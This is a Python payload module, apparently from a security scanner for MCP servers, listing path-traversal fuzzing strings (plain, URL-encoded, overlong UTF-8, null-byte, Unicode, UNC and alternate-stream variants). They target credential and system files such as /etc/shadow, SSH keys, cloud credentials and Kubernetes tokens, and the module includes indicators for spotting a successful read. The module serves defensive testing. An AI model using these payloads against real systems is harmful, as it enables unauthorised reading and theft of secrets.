"""Path-traversal fuzzing payloads for R5 (input validation) and R1
(unauthorised file access).

Categories:

* ``UNIX_PAYLOADS``      — POSIX traversal sequences and encodings
* ``WINDOWS_PAYLOADS``   — Windows path/UNC variants
* ``MACOS_PAYLOADS``     — Darwin-specific targets (keychain, plist, etc.)
* ``CONTAINER_PAYLOADS`` — Docker/Kubernetes filesystem leaks
* ``NULL_BYTE_PAYLOADS`` — null-byte truncation bypasses
* ``ENCODED_PAYLOADS``   — double/triple URL-encoding, unicode normalisation
"""

from __future__ import annotations

# ---------------------------------------------------------------------------
# Sensitive targets (used by indicators + as raw test paths)
# ---------------------------------------------------------------------------

SENSITIVE_TARGETS: list[str] = [
    # POSIX system files
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/group",
    "/etc/sudoers",
    "/etc/ssh/sshd_config",
    "/etc/crontab",
    "/etc/resolv.conf",
    "/etc/nsswitch.conf",
    "/etc/fstab",
    "/etc/mtab",
    "/etc/issue",
    "/etc/os-release",
    "/etc/machine-id",

    # /proc — process / kernel introspection
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/status",
    "/proc/self/maps",
    "/proc/self/cwd",
    "/proc/self/exe",
    "/proc/self/fd/0",
    "/proc/self/mountinfo",
    "/proc/self/cgroup",
    "/proc/cpuinfo",
    "/proc/meminfo",
    "/proc/version",
    "/proc/mounts",
    "/proc/net/tcp",
    "/proc/net/udp",
    "/proc/net/route",
    "/proc/net/arp",
    "/proc/1/environ",
    "/proc/1/cmdline",

    # User secrets — SSH / cloud / dev
    "~/.ssh/id_rsa",
    "~/.ssh/id_ed25519",
    "~/.ssh/authorized_keys",
    "~/.ssh/known_hosts",
    "~/.ssh/config",
    "~/.aws/credentials",
    "~/.aws/config",
    "~/.gcp/credentials.json",
    "~/.config/gcloud/credentials.db",
    "~/.kube/config",
    "~/.docker/config.json",
    "~/.netrc",
    "~/.npmrc",
    "~/.pypirc",
    "~/.gitconfig",
    "~/.git-credentials",
    "~/.bash_history",
    "~/.zsh_history",
    "~/.python_history",
    "~/.mysql_history",
    "~/.psql_history",

    # Container / runtime metadata
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
    "/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/docker.sock",
    "/.dockerenv",

    # Application dirs
    "/var/log/auth.log",
    "/var/log/syslog",
    "/var/log/messages",
    "/var/log/secure",
    "/var/log/audit/audit.log",
    "/var/log/nginx/access.log",
    "/var/log/apache2/access.log",
    "/var/spool/cron/root",
    "/var/spool/cron/crontabs/root",

    # Windows
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Windows\\System32\\config\\SAM",
    "C:\\Windows\\System32\\config\\SYSTEM",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config",
    "C:\\boot.ini",
    "C:\\Windows\\repair\\sam",
    "C:\\Windows\\repair\\system",
    "C:\\inetpub\\wwwroot\\web.config",
    "C:\\Users\\Administrator\\NTUSER.DAT",

    # macOS
    "/etc/master.passwd",
    "/private/etc/master.passwd",
    "/Library/Preferences/SystemConfiguration/preferences.plist",
    "/var/db/dslocal/nodes/Default/users/root.plist",
    "~/Library/Keychains/login.keychain-db",
    "~/Library/Application Support/Google/Chrome/Default/Login Data",
    "~/Library/Application Support/Claude/claude_desktop_config.json",

    # Source repo / dev secrets
    ".env",
    ".env.local",
    ".env.production",
    ".env.development",
    "config/database.yml",
    "config/secrets.yml",
    "wp-config.php",
    "settings.py",
    ".git/config",
    ".git/HEAD",
    ".git/credentials",
    ".svn/wc.db",
    ".hg/hgrc",
    "id_rsa",
    "private.pem",
    "secrets.json",
    "credentials.json",
    "service-account.json",
    "appsettings.json",
    "application.properties",
]

# ---------------------------------------------------------------------------
# POSIX traversal
# ---------------------------------------------------------------------------

UNIX_PAYLOADS: list[str] = [
    # Plain dot-dot-slash
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../../../../../../etc/passwd",

    # Single URL-encode (%2F = '/')
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",

    # Double URL-encode (%252F = '%2F' decoded twice)
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",

    # Triple-encode for naïve middleware that decodes once before passing on
    "..%25252F..%25252F..%25252Fetc%25252Fpasswd",

    # Overlong UTF-8 of '/'
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%c1%9c..%c1%9cetc/passwd",

    # Trailing-slash and dot tricks for Windows/IIS-style normalisation
    "....//....//....//etc/passwd",
    ".../.../.../etc/passwd",
    "....\\....\\....\\etc/passwd",
    "../%2e%2e/%2e%2e/etc/passwd",

    # Backslash-on-POSIX (defensive coding bug surface)
    "..\\..\\..\\etc\\passwd",
    "..\\/..\\/..\\/etc\\/passwd",

    # Absolute paths (skip the traversal if the joiner accepts absolutes)
    "/etc/passwd",
    "/./etc/passwd",
    "/./../../../etc/passwd",
    "//etc/passwd",
    "///etc/passwd",
    "/etc/./passwd",
    "/etc/../etc/passwd",

    # /proc / runtime targets via traversal
    "../../../proc/self/environ",
    "../../../proc/self/cmdline",
    "../../../proc/1/environ",
    "../../../proc/net/tcp",
    "../../../var/run/secrets/kubernetes.io/serviceaccount/token",
    "../../../.dockerenv",
    "../../../var/run/docker.sock",

    # Home / dotfile targets
    "../../../root/.ssh/id_rsa",
    "../../../root/.bash_history",
    "../../../home/user/.aws/credentials",
    "../../../home/user/.kube/config",
    "../../../home/user/.netrc",

    # Logs
    "../../../var/log/auth.log",
    "../../../var/log/syslog",

    # Repo secrets via traversal back into project dir
    "../../.env",
    "../../../.env",
    "../../.git/config",
    "../../../.git/credentials",
    "../../config/database.yml",
    "../../wp-config.php",
]

# ---------------------------------------------------------------------------
# Windows traversal + UNC + ADS
# ---------------------------------------------------------------------------

WINDOWS_PAYLOADS: list[str] = [
    "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "..\\..\\..\\Windows\\win.ini",
    "..\\..\\..\\Windows\\System32\\config\\SAM",
    "..\\..\\..\\Windows\\System32\\config\\SYSTEM",
    "..\\..\\..\\boot.ini",
    "..\\..\\..\\inetpub\\wwwroot\\web.config",

    # URL-encoded backslash variants
    "..%5C..%5C..%5CWindows%5Cwin.ini",
    "..%5c..%5c..%5cWindows%5cwin.ini",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini",
    "..%255C..%255C..%255CWindows%255Cwin.ini",

    # UNC / device namespace
    "\\\\127.0.0.1\\C$\\Windows\\win.ini",
    "\\\\?\\C:\\Windows\\System32\\drivers\\etc\\hosts",
    "\\\\.\\C:\\Windows\\win.ini",
    "\\\\localhost\\admin$\\System32\\config\\SAM",

    # Drive-letter absolute (bypasses traversal counter)
    "C:\\Windows\\win.ini",
    "C:/Windows/win.ini",
    "C:\\..\\Windows\\win.ini",

    # Alternate Data Streams
    "C:\\Windows\\win.ini::$DATA",
    "C:\\Windows\\win.ini:Zone.Identifier",

    # 8.3 short-name aliases (defeat allow-listing on long names)
    "C:\\PROGRA~1\\..\\Windows\\win.ini",
    "C:\\WINDOW~1\\System32\\drivers\\etc\\hosts",

    # Mixed case / forward-slash
    "C:/WINDOWS/system32/DRIVERS/ETC/HOSTS",
]

# ---------------------------------------------------------------------------
# macOS-specific
# ---------------------------------------------------------------------------

MACOS_PAYLOADS: list[str] = [
    "../../../private/etc/master.passwd",
    "../../../private/var/db/dslocal/nodes/Default/users/root.plist",
    "../../../Library/Preferences/SystemConfiguration/preferences.plist",
    "../../../Users/Shared/.config",
    "../../../private/var/log/system.log",
    "../../../private/var/log/install.log",
    "../../../private/etc/sudoers",
    # User-scoped
    "~/Library/Application Support/Claude/claude_desktop_config.json",
    "~/Library/Cookies/Cookies.binarycookies",
    "~/Library/Keychains/login.keychain-db",
]

# ---------------------------------------------------------------------------
# Container / orchestration leaks
# ---------------------------------------------------------------------------

CONTAINER_PAYLOADS: list[str] = [
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
    "/run/secrets/kubernetes.io/serviceaccount/token",
    "/.dockerenv",
    "/proc/1/cgroup",
    "/proc/self/cgroup",
    "/proc/self/mountinfo",
    "/etc/hostname",
    "/var/run/docker.sock",
    "/var/lib/kubelet/pods",
    "/etc/kubernetes/admin.conf",
    "/etc/kubernetes/kubelet.conf",
    "/var/lib/etcd/member/snap/db",
    # Common in CI runners
    "/proc/self/environ",  # CI tokens leak via env
    "/github/workspace/.git/config",
    "/builds/.git/config",
]

# ---------------------------------------------------------------------------
# Null-byte truncation
# ---------------------------------------------------------------------------

NULL_BYTE_PAYLOADS: list[str] = [
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.txt",
    "../../../etc/passwd\x00.png",
    "../../../etc/passwd\x00.jpg",
    "../../../etc/passwd%00.pdf",
    "../../../etc/passwd%2500",
    # Newline / CR truncation (some parsers stop at \r\n)
    "../../../etc/passwd%0a",
    "../../../etc/passwd%0d%0a",
    "../../../etc/passwd\n.txt",
]

# ---------------------------------------------------------------------------
# Unicode / normalisation bypasses
# ---------------------------------------------------------------------------

ENCODED_PAYLOADS: list[str] = [
    # UTF-8 BOM prefix to defeat string-prefix checks
    "\ufeff../../../etc/passwd",

    # Full-width (NFKC normalises to '/')
    "..\uff0f..\uff0f..\uff0fetc\uff0fpasswd",
    "..\uff0e\uff0e/etc/passwd",

    # Combining marks that NFC normalises away
    "../../../et\u0301c/passwd",

    # Visually-confusing Cyrillic 'е' / Greek 'ο' (allow-list bypass on names)
    "../../../еtc/passwd",
    "../../../etc/pаsswd",

    # Unicode division slash (U+2215) and fraction slash (U+2044)
    "..\u2215..\u2215..\u2215etc\u2215passwd",
    "..\u2044..\u2044..\u2044etc\u2044passwd",

    # Right-to-left override hides extension in display
    "../../../etc/pas\u202esword",
]

ALL_PAYLOADS: list[str] = (
    UNIX_PAYLOADS
    + WINDOWS_PAYLOADS
    + MACOS_PAYLOADS
    + CONTAINER_PAYLOADS
    + NULL_BYTE_PAYLOADS
    + ENCODED_PAYLOADS
)

# ---------------------------------------------------------------------------
# Response-side indicators
# ---------------------------------------------------------------------------

INDICATORS: list[str] = [
    # /etc/passwd signatures
    "root:x:0:0",
    "root:*:0:0",
    "daemon:x:1",
    "nobody:x:65534",

    # /etc/shadow signatures
    "root:$1$",
    "root:$5$",
    "root:$6$",
    "root:!",

    # Windows hosts / win.ini
    "[extensions]",
    "[boot loader]",
    "; for 16-bit app support",
    "[fonts]",

    # /proc/self/environ
    "HOME=",
    "PATH=",
    "USER=",
    "PWD=",
    "SHELL=",
    "HOSTNAME=",

    # Common host map signal
    "127.0.0.1\tlocalhost",
    "127.0.0.1 localhost",
    "::1\tlocalhost",

    # SSH key headers
    "-----BEGIN OPENSSH PRIVATE KEY-----",
    "-----BEGIN RSA PRIVATE KEY-----",
    "-----BEGIN EC PRIVATE KEY-----",
    "-----BEGIN DSA PRIVATE KEY-----",
    "-----BEGIN PGP PRIVATE KEY BLOCK-----",

    # AWS / cloud creds patterns
    "AKIA",                  # AWS access-key prefix
    "aws_access_key_id",
    "aws_secret_access_key",
    "[default]",             # ~/.aws/credentials section header
    "client_email",          # GCP service-account JSON
    "private_key_id",        # GCP
    "BEGIN PRIVATE KEY",     # PKCS#8

    # K8s service-account JWT (header is always eyJhbGciOi...)
    "eyJhbGciOi",

    # Container hints
    "docker",
    "kubepods",
    "containerd",
]


def looks_like_traversal_success(response_text: str) -> bool:
    """Heuristic: does the response contain content from a sensitive file?

    Echoed payload paths (e.g. ``input_value={'name': '../../etc/passwd'}``
    in a Pydantic validation error) would otherwise match indicators like
    ``/etc/passwd``. Strip those echoes first so the check sees only the
    server's own output.
    """
    from mcp_dynamic_analyzer.payloads._response_filters import strip_input_echoes
    lower = strip_input_echoes(response_text).lower()
    for ind in INDICATORS:
        if ind.lower() in lower:
            return True
    return False
